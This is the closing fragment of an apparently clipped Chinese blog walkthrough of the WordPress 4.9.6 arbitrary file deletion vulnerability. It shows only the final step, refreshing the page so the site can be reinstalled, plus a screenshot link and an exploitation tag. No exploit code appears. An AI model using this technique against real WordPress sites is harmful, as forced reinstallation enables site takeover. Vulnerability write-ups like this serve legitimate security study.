<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><strong STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;">5. 刷新网页</strong></p>
<p STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">已经可以重装网站。</p>
<a HREF="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/5.1.png" TITLE="Wordpress AFD" TARGET="_blank" STYLE="display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);"><div STYLE="margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;"><img src="../_resources/541618cc2a3a51a47fda214bcfdd1e99.png"  type="image/png" hash="541618cc2a3a51a47fda214bcfdd1e99" title="Wordpress AFD" width="576" height="454" style="display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);" alt="" /></en-media></div></a>Wordpress AFD

      
    </div>
    <div STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;">
      <a TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">Share</a>
      
      
  <ul STYLE="margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:none outside none;list-style-type:none;"><li STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;"><a HREF="https://blog.vulnspy.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" TARGET="_blank" STYLE="margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);">漏洞利用</a></li></ul>

    </div>
  </div></div></div><div STYLE="position:absolute;top:-1000px;left:-1000px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">Measure</div><div STYLE="margin-bottom:0px;position:absolute;top:-1000px;left:-1000px;line-height:1;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;">Measure</div></div></div></div></div></div></div></div>
</div>
</en-note>      